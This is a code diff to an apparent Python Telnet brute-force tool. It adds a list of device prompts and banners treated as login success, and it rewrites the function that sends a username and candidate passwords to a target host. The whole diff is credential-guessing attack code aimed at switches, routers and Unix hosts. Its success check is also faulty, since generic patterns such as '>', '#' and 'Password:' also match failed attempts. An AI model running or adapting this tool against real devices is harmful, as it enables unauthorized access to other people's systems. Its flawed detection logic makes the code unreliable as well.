@@ -20,6 +20,34 @@ progressLine = ""
 timerThread = None
 stdoutLock = threading.Lock()
 
+# Common success patterns for various devices
+SUCCESS_PATTERNS = [
+    "Login successful",
+    "User Access Verification",
+    "Press Enter to continue",
+    "Welcome to the CLI",
+    "Switch>",  # Cisco switches
+    "Router>",  # Cisco routers
+    "hostname>",  # Generic device prompt
+    ">",  # Generic prompt
+    "#",  # Some devices use a root-level prompt
+    "login:",  # Some devices print "login:" after successful auth
+    "Password:",  # In case there's another password prompt
+    "CLI>",  # Common CLI prompt for various devices
+    "User:",  # Generic user prompt
+    "Login the CLI by",  # Your success banner
+    "Welcome to your system",  # Generic success banner
+    "Network Access Login",  # Generic networking devices
+    "Enter the system",  # Some Unix/Linux-like systems
+    "admin@",  # Some Unix/Linux prompt
+    "root@",  # Some Unix/Linux prompt
+    "Access granted",  # Generic message
+    "Success",  # Very generic
+    "Session started",  # Some systems use this
+    ">>>",  # Python interactive shell prompt
+    ">",  # Many switches and routers have a '>' prompt
+]
+
 def UpdateTimer(startTime):
     while not stopTimer:
         elapsed = time.time() - startTime
@@ -68,48 +96,36 @@ def TelnetBruteForce(host, port, username, passwords):
 
 def TryPassword(host, port, username, password, successBanner):
     try:
-        # Create socket and connect to target
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock = socket.socket()
         sock.settimeout(5)
         sock.connect((host, port))
 
-        # Read until we get 'User:' prompt (Telnet)
-        sock.send(b"\r\n")  # Send an initial newline to get the prompt
-        time.sleep(0.2)  # Wait for the prompt to come back
-        data = sock.recv(1024).decode(errors="ignore")  # Decode bytes to string
-
-        if "User:" not in data:
-            sock.close()
-            return False
-
         # Send username
         sock.send((username + "\r\n").encode())
-        time.sleep(0.2)  # Give some time for the prompt to come back
-
-        # Expecting password prompt
-        data = sock.recv(1024).decode(errors="ignore")  # Decode bytes to string
+        data = sock.recv(1024).decode(errors="ignore")
+        
+        # Wait for Password prompt
         if "Password:" not in data:
-            sock.close()
             return False
 
         # Send password
         sock.send((password + "\r\n").encode())
-        time.sleep(0.2)
+        data = sock.recv(1024).decode(errors="ignore")
+        
+        # Check if any of the success patterns are in the response
+        for pattern in SUCCESS_PATTERNS:
+            if pattern in data:
+                return True
+        
+        return False
 
-        # Get the output after sending the password
-        output = sock.recv(1024).decode(errors="ignore")  # Decode bytes to string
-        sock.close()
-
-        # Check if success banner is in output
-        return successBanner in output
     except Exception as e:
-        print(f"[!] Error: {e}")
+        print(f"[!] Error during password attempt: {e}")
         return False
     finally:
         try:
             sock.close()
-        except:
-            pass
+        except: pass
 
 def LoadPasswords(path):
     try:
